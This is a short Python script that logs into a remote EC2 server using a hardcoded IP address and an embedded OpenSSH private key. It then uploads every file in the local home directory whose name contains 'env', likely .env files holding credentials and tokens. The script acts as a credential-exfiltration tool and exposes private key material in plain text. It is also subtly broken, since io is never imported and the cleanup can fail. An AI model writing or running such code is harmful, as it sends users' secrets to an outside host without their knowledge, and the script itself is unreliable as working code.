import paramiko
import os

# Connection details
ec2_host = "23.20.49.160"
ec2_port = 22
ec2_user = "ec2-user"
pem_content = """
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAssQ+Nc7Fv4M2nmqbiqbT4OiYtzcBbxg6VrkQQ5c4wLRzsidcx8X4
tokdIEVgjXUq6PaobFFcjKlb3Qx16pXXh0oZYP92HtK7R6iwR5Yq6kDixeb802cW6KPdd/
lzEoYvIQrYbPqWeffU7baKFP8q7flrQ06/BOgv/Y6ulZ2OMWqzKyjBRK1F+b1qyjXWCPam
locW8TILMeOC730VPh650VgBL+UJCsLw8SzF3kerBgitsWcqXYEsrPD1fg2kl7+6fVTcV0
/bgMeMkftc7LuIxH3awq4pVCN69ELDCXODjEosfZri/ApdtbPp4+Vq4Jno97n8AXygpfTO
p+IG1w42CQAAA8DOxxldzscZXQAAAAdzc2gtcnNhAAABAQCyxD41zsW/gzaeapuKptPg6J
i3NwFvGDpWuRBDlzjAtHOyJ1zHxfi2iR0gRWCNdSro9qhsUVyMqVvdDHXqldeHShlg/3Ye
0rtHqLBHlirqQOLF5vzTZxboo913+XMShi8hCths+pZ599TttooU/yrt+WtDTr8E6C/9jq
6VnY4xarMrKMFErUX5vWrKNdYI9qaWhxbxMgsx44LvfRU+HrnRWAEv5QkKwvDxLMXeR6sG
CK2xZypdgSys8PV+DaSXv7p9VNxXT9uAx4yR+1zsu4jEfdrCrilUI3r0QsMJc4OMSix9mu
L8Cl21s+nj5Wrgmej3ufwBfKCl9M6n4gbXDjYJAAAAAwEAAQAAAQA/n8K4aeBNmgitdynm
vht416/KvYQAIzJYPUOBmuezBkaLKKFH5LjxVnmMS8Tic8oS4f7tlkOHOJueX9nz5OKxnv
jLYgCLVdsb1PjwcYzSlMdhQiXHo9AuemvPUHPZKvLJItAGcWVvAXrCJA6fDHYd/oBjkzo/
J9g0uTx/uXSrN0Kr/Kw6wTATtlZJsDyBfq4TjYjl6m8Q3LEL2aMsi4Ky1mvDF4LdlhGReX
vsUnJyobDgWw/kjdU5wuniGYKL/Ys+OVYmJnjTPXfuqnqa59JCQyW+7yzfdXRx6JVxNNO7
JO1LcKcY3e6INSbY2sCWsYBNs3sLXD3SA4joWQbrI63FAAAAgQCRM+9M746zvRrqiZnKMw
m3I4vRAMfcFKEbxdE7dQwU6IkebT2fRNofrKS99QFe5zK8UTVSZKM0PHmg2BOR+5r+QbWt
cQN2IJMRWhMImUOOYvnEEtLV1GTd/f2wzHxlV3ZwaL9U/zpbRdNVc9UVu+B0Ucge5402Tr
AxJNvj2BmfXgAAAIEA6ffS/z0Wt1m5cgq56amIfBrvtBP1A+jAA6VIDuM84U/a5sZSqNdm
dBYSVj8yEyz0vZklqNBMktr7TuwWYIcZfakpOmi5SSqZuBxDfUdk+LDPbc08J2bNBw2BXA
Eydtnb/aB6dpt1urqS5vg7wzDIZgi0Oe8IMlfoHCiwa3xqsg8AAACBAMOZssK6NRNwWFQE
yaM8arxBOo0+/f9K2n1+tKgpngmP0jitQPYLxh+uIC7H/EO7ZiYMjozfEtfV1+OxFnCTV8
LlLQW26hVUoNa1U607WwGKA1pPjcb7hnXAkmnEdNfLzyU7/4Y6v46N59+GZcdS5m41ws+u
6o57V0ldgtq8IE5nAAAACDE3OTg4QERpAQI=
-----END OPENSSH PRIVATE KEY-----
"""

# Create an SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Load the private key
private_key = paramiko.RSAKey.from_private_key(io.StringIO(pem_content))

try:
    # Connect to the EC2 instance
    ssh.connect(hostname=ec2_host, port=ec2_port, username=ec2_user, pkey=private_key)
    
    # Create SFTP session
    sftp = ssh.open_sftp()
    
    # Ensure the remote directory exists
    remote_directory = '/home/ec2-user/files'
    try:
        sftp.stat(remote_directory)
    except FileNotFoundError:
        sftp.mkdir(remote_directory)

    # Upload files matching the pattern
    local_directory = os.path.expanduser('~')
    for filename in os.listdir(local_directory):
        if 'env' in filename:
            local_path = os.path.join(local_directory, filename)
            remote_path = os.path.join(remote_directory, filename)
            sftp.put(local_path, remote_path)
            print(f"Uploaded {local_path} to {remote_path}")

finally:
    # Close the SFTP session and SSH connection
    sftp.close()
    ssh.close()